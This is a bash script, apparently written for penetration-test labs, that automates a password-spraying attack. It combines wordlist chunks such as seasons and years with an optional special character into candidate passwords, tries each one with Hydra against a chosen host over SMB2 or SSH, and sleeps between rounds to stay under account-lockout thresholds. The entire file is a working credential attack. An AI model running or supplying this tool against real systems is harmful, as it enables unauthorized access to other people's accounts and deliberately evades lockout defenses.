#!/bin/bash

# Prompt for chunk files
read -p "Enter file for password chunk 1 (e.g., seasons.txt): " CHUNK1_FILE
read -p "Enter file for password chunk 2 (e.g., years.txt): " CHUNK2_FILE
read -p "Enter special character to try (e.g., ! or leave blank): " SPECIAL

# Prompt for Hydra options
read -p "Enter user file (e.g., users.txt): " USERFILE
read -p "Enter target IP or hostname: " TARGET
read -p "Enter protocol (e.g., smb2, ssh): " PROTOCOL
read -p "Enter domain or module string (e.g., workgroup:{hiboxy}): " DOMAIN

# Prompt for wait time
read -p "Enter sleep time between attempts (in minutes): " SLEEP_MINUTES
SLEEP_SECONDS=$((SLEEP_MINUTES * 60))

# Preview
FIRST_CHUNK=$(head -n1 "$CHUNK1_FILE")
SECOND_CHUNK=$(head -n1 "$CHUNK2_FILE")
echo "Example password 1: ${FIRST_CHUNK}${SECOND_CHUNK}"
echo "Example password 2: ${FIRST_CHUNK}${SECOND_CHUNK}${SPECIAL}"
echo "Sleep time: $SLEEP_MINUTES minute(s)"
read -p "Proceed with the spray attack? (y/n): " CONFIRM

if [[ "$CONFIRM" != "y" ]]; then
  echo "Aborted."
  exit 1
fi

# Loop through combinations
while IFS= read -r c1; do
  while IFS= read -r c2; do
    for suffix in "" "$SPECIAL"; do
      PASSWORD="${c1}${c2}${suffix}"
      echo "[*] Trying password: $PASSWORD"
      hydra -L "$USERFILE" -p "$PASSWORD" -m "$DOMAIN" "$TARGET" "$PROTOCOL"
      echo "[*] Sleeping $SLEEP_MINUTES minute(s) to avoid lockout..."
      sleep "$SLEEP_SECONDS"
    done
  done < "$CHUNK2_FILE"
done < "$CHUNK1_FILE"
